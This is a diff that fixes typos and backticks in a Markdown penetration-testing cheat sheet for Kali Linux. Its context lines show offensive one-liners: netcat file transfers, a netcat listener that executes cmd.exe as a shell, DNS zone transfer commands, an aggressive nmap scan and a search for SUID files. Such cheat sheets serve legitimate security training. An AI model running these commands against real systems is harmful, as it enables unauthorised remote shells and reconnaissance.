@@ -134,7 +134,7 @@ Kali Linux
         `nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe`
 
     -   Receive a file using netcat  
-        `nc -nlvp 4444 't; incoming.exe`
+        `nc -nlvp 4444 > incoming.exe`
 
     -   Create a reverse shell with Ncat using cmd.exe on Windows  
         `nc -nlvp 4444 -e cmd.exe`
@@ -268,7 +268,7 @@ Information Gathering & Vulnerability Scanning
 
     -   DNS Zone Transfers  
         Windows DNS zone transfer  
-        `nslookup -> set type=any -. ls -d blah.com  `
+        `nslookup -> set type=any -> ls -d blah.com  `
         Linux DNS zone transfer  
         `dig axfr blah.com @ns1.blah.com`
 
@@ -385,7 +385,7 @@ Information Gathering & Vulnerability Scanning
         [*https://nmap.org/nsedoc/categories/discovery.html*](https://nmap.org/nsedoc/categories/discovery.html)
 
     -   Nmap port version detection MAXIMUM power  
-        `nmap -vvv -A --reason --script="+(safe or default) and not broadcast" -p <port> <host>
+        `nmap -vvv -A --reason --script="+(safe or default) and not broadcast" -p <port> <host>`
 
     -   
 
@@ -610,7 +610,7 @@ Information Gathering & Vulnerability Scanning
         `find /. -name suid\*`
 
     -   Find all the strings in a file  
-        `strings <filename>;`
+        `strings <filename>`
 
     -   Determine the type of a file  
         `file <filename>`
